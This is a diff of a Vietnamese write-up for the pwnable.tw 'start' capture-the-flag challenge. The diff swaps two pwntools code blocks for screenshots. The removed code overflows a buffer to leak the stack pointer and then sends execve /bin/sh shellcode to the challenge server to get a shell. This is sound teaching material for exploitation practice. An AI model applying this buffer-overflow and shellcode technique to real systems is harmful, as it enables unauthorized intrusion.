@@ -119,17 +119,8 @@ Chúng ta có thể thấy địa chỉ của stack pointer được đẩy lên
 ![image](https://user-images.githubusercontent.com/90976397/175950678-11b976eb-49cf-4699-896e-4a46758c7df9.png)
 
 > Bây giờ thứ chúng ta đã có là chúng ta có thể control được return address và stack pointer ở trên là thứ chúng ta cần phải leak, chúng ta có thể lợi dụng những gì chương trình có được để có thể leak. Quay lại đọc assembly code :D. Tại offset 0x08048087 chính là để bắt đầu in nội dung ở stack (ở đây chính là stack pointer) ra console. Và 4 byte đầu được in ra chính là stack pointer mà chúng ta cần ở đầu chương trình. Và đó chính là cách mà chúng ta sẽ thực hiện.
-```
-from pwn import *
-r = process('./start')
-payload = b'a'*20 + p32(0x08048087) #20 chữ a là để fill buffer, p32(0x08048087) để ghi đè return address về 0x08048087
-r.sendafter(b':',payload)
-leak = r.recv()[0:4] 
-print(leak)
-esp = u32(leak)
-log.info('esp: '+hex(esp))
-r.interactive()
-```
+![image](https://user-images.githubusercontent.com/90976397/175961425-4e24ad6e-68a6-4de6-b10d-8e799b47e067.png)
+
 ![image](https://user-images.githubusercontent.com/90976397/175954741-cdfe281b-e89f-4c78-a4b2-632ce353c320.png)
 
 Và từ đó chúng ta đã có thể leak được địa chỉ của stack pointer
@@ -138,28 +129,12 @@ Sau khi có được địa chỉ của stack pointer thì bước cuối cùng 
 Btw, một câu nói mình đã nghe đâu đó, "đừng có lạm dụng những thứ có sẵn quá nhiều, nên code ra để xem thử nó ra sao", nếu bạn là người mới chơi thì nên tự code shellcode để xem nó ra sao thay vì lên shellstorm lấy shellcode có sẵn. 
 Và đây là exploit cuối của mình 
 
-```
-from pwn import * 
-shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
-
-r = remote("chall.pwnable.tw",10000)
-#r = process('./start')
-payload = b'a'*20 + p32(0x08048087) #20 chữ a là để fill buffer, p32(0x08048087) để ghi đè return address về 0x08048087
-r.sendafter(b':',payload)
-leak = r.recv()[0:4] #
-print(leak)
-esp = u32(leak)
-log.info('esp: '+hex(esp))
-payload = b'a'*20 + p32(esp + 20) + shellcode
-r.send(payload)
-r.interactive()
-```
+![image](https://user-images.githubusercontent.com/90976397/175961546-e7a11ffa-00e9-49f2-a538-55e3a1f4a996.png)
 
 ![image](https://user-images.githubusercontent.com/90976397/175957620-212eb1c9-8313-441e-a2b4-879b6c73913d.png)
 
 Cảm ơn bạn vì đã đọc hết. Nếu như bạn không hiểu gì thì hãy ngồi viết ra và suy ngẫm lại xem mình đang mắc ở đâu và fix nó như nào. 
 
--y198-
 
 ![kientri](https://user-images.githubusercontent.com/90976397/175959023-4e678907-b395-4b52-9cc9-04fd382d8272.png)
 
